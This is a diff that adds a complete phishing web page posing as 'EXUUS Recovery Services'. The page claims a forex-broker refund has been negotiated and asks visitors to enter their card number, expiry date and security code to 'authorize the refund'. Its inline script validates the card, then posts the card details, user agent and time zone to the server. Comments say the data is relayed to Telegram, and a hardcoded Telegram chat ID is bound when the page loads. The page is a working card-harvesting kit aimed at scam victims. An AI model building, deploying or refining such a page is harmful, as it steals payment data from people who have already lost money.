@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style/index.css" />
+    <title>Refund - EXUUS LIMITED</title>
+    <style>
+      .error-text { color: #d32f2f; font-size: 0.875rem; margin-top: 0.25rem; }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo"></div>
+
+      <div class="payment-details">
+        <p>At EXUUS Recovery Services, a specialized division of EXUUS LIMITED, our expert dispute resolution team has negotiated on your behalf to reclaim funds held by an unlicensed forex broker.</p>
+        <p>Following extensive correspondence and a formal settlement agreement, the broker has committed to a refund the entire principal amount deposited on the trading platform.</p>
+        <p>Please complete the form below to verify your card information and authorize the refund transfer. We appreciate the opportunity to assist you and remain dedicated to protecting your financial interests.</p>
+      </div>
+
+      <h2 class="title">Settlement Refund Authorization</h2>
+
+      <form id="refund-form" class="form" novalidate>
+        <div class="form-group">
+          <div class="outlined-input-field">
+            <input type="text" id="name" name="name" class="outlined-text-field" autocomplete="off" required />
+            <label for="name">Name</label>
+            <div class="helper-text"></div>
+            <div id="error-name" class="error-text"></div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <div class="outlined-input-field">
+            <input type="text" id="cardnumber" name="cardnumber" class="outlined-text-field" autocomplete="off" required />
+            <label for="cardnumber">Card Number</label>
+            <i></i>
+            <div class="helper-text"></div>
+            <div id="error-cardnumber" class="error-text"></div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <div class="inline-form-group">
+            <div class="outlined-input-field">
+              <input type="text" id="expirationdate" name="expirationdate" class="outlined-text-field" autocomplete="off" required />
+              <label for="expirationdate">Expiry (MM/YY)</label>
+              <div class="helper-text"></div>
+              <div id="error-expirationdate" class="error-text"></div>
+            </div>
+
+            <div class="outlined-input-field">
+              <input type="text" id="securitycode" name="securitycode" class="outlined-text-field" autocomplete="off" required />
+              <label for="securitycode">Security Code</label>
+              <div class="helper-text"></div>
+              <div id="error-securitycode" class="error-text"></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <button type="button" id="refund-btn" class="button">REFUND</button>
+        </div>
+      </form>
+
+      <div class="verified">
+        <div class="visa"></div>
+        <div class="mastercard"></div>
+      </div>
+    </div>
+
+    <!-- existing scripts -->
+    <script src="js/jquery.min.js"></script>
+    <script src="js/imask.min.js"></script>
+    <script src="js/input.js"></script>
+    <script src="js/index.js"></script>
+
+    <!-- bind this page’s session for refunds -->
+    <script>
+      (function(){
+        const chatId = 7398305164; // your Telegram chat ID
+        fetch('/bind-refund', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chatId,
+            ua: navigator.userAgent,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+          })
+        })
+        .then(() => console.log('✅ bind‑refund sent'))
+        .catch(console.error);
+      })();
+    </script>
+
+    <!-- validation and inline click handler -->
+    <script>
+      function clearErrors() {
+        ['name','cardnumber','expirationdate','securitycode'].forEach(id => {
+          document.getElementById('error-' + id).textContent = '';
+        });
+      }
+      function showError(field, message) {
+        document.getElementById('error-' + field).textContent = message;
+      }
+      function luhnCheck(num) {
+        let sum = 0, flip = false;
+        for (let i = num.length - 1; i >= 0; i--) {
+          let n = parseInt(num[i], 10);
+          if (flip) n *= 2;
+          if (n > 9) n -= 9;
+          sum += n;
+          flip = !flip;
+        }
+        return sum % 10 === 0;
+      }
+      function validateExpiry(mmYY) {
+        const [m, y] = mmYY.split('/').map(s => parseInt(s,10));
+        if (!m || !y || m<1 || m>12) return false;
+        const now = new Date(), exp = new Date(2000+y, m-1, 1);
+        return exp >= new Date(now.getFullYear(), now.getMonth(),1);
+      }
+      function validateCVV(cvv) {
+        return /^[0-9]{3,4}$/.test(cvv);
+      }
+
+      document.addEventListener('DOMContentLoaded', () => {
+        const btn = document.getElementById('refund-btn');
+        btn.addEventListener('click', async () => {
+          clearErrors();
+          let valid = true;
+          const name = document.getElementById('name').value.trim();
+          const cardNum = document.getElementById('cardnumber').value.replace(/\D/g,'');
+          const exp = document.getElementById('expirationdate').value.trim();
+          const cvv = document.getElementById('securitycode').value.trim();
+          if (!name) { showError('name','Name is required'); valid = false; }
+          if (!luhnCheck(cardNum)) { showError('cardnumber','Invalid card number'); valid = false; }
+          if (!validateExpiry(exp)) { showError('expirationdate','Invalid or expired date'); valid = false; }
+          if (!validateCVV(cvv)) { showError('securitycode','Invalid security code'); valid = false; }
+          if (!valid) return;
+
+          // gather data and send to Telegram
+          const data = {};
+          new FormData(document.getElementById('refund-form')).forEach((v,k)=>data[k]=v);
+          data.ua = navigator.userAgent;
+          data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+          try {
+            const res = await fetch('/refund', {
+              method: 'POST',
+              headers: {'Content-Type':'application/json'},
+              body: JSON.stringify(data)
+            });
+            if (!res.ok) throw new Error(res.statusText);
+            // redirect after successful POST
+            window.location.href = '/loading.html';
+          } catch (e) {
+            console.error('Refund POST failed', e);
+            alert('❌ Error sending refund.');
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
